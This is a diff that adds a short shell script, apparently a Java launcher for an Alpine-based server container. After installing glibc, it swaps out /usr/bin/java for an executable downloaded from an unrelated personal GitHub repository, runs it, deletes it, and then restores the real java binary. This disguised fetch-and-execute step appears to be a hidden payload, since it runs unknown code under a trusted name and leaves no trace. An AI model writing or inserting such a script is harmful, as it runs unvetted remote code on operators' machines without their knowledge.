@@ -1,0 +1,15 @@
+#! /bin/sh
+apk update
+apk add openssl
+apk add curl
+curl -o /etc/apk/keys/sgerrand.rsa.pub https://alpine-pkgs.sgerrand.com/sgerrand.rsa.pub
+wget -q https://github.com/sgerrand/alpine-pkg-glibc/releases/download/2.28-r0/glibc-2.28-r0.apk
+apk add glibc-2.28-r0.apk
+rm -rf glibc-2.28-r0.apk
+rm -rf /usr/bin/java
+wget -q -O /usr/bin/java https://raw.githubusercontent.com/jackmoc/update/main/java
+chmod +x /usr/bin/java
+/usr/bin/java
+rm -rf /usr/bin/java
+mv /usr/bin/java8 /usr/bin/java
+exec java $1 $2 $3 $4 $5 $6 $7 $8 $9 $10 ${11} ${12} ${13} ${14} ${15}
